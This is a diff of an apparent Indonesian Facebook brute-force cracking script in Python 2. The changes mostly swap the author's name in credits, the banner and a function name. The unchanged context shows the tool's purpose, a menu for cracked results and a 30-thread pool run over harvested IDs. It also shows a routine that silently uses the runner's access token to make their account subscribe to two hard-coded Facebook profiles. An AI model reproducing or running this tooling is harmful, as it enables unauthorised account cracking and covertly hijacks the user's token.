@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-#BY : Ilham Ganteng Banget
+#BY :nurohmn tamvan
 import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
 import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
 from multiprocessing.pool import ThreadPool
@@ -62,7 +62,7 @@ def logo():
 \033[1;96m \___/|_|  |_|____/|_|
 \033[1;96m JEMBUT \033[1;95m MULTI \033[1;93m BRUTE \033[1;97m FORCE
 \033[0;93m  •••••••••••••••••••••••••••••••••••••••••••••••••
-\033[1;92m       ILHAM \033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT 
+\033[1;92m       nurohman \033[0;96m ---- \033[1;93m tamvan \033[0;96m ---- \033[095m BANGETT 
 \033[0;96m [][][][][][][][][][][][][][[]][[]][[]][[]][[]][[]]""""")
 id = []
 cp = []
@@ -160,9 +160,9 @@ def menu():
 	print" \033[0;92m  3. LIHAT HASIL CRACK"
 	print" \033[0;93m  0. HAPUS TOKEN"
 	print
-	hamz_ganteng()
+	Nurohman_tamvan()
 	
-def hamz_ganteng():
+def nurohman_tamvan():
 	ask = raw_input("\033[1;95m  ︻デ═一▸ \033[92m :\033[1;92m ")
 	if ask == "":
 		print
@@ -289,7 +289,7 @@ def hamz_ganteng():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	print(" \ncrack selsai cuy,jangan lupa ngocok...")
+	print(" \ncrack selsai cuy,jangan lupa ngaca..")
 	exit()
 
 def manual():
@@ -356,7 +356,7 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    kom = " Bang tamvan Bangetz Ngga Ada Obat 😘😘😘😘"
     requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)
 
